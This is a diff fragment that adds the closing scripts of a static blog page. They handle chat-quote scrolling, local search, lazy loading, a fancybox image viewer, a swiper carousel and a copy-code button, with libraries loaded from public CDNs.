+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script async src="/js/title.js"></script>
+</div></body></html>
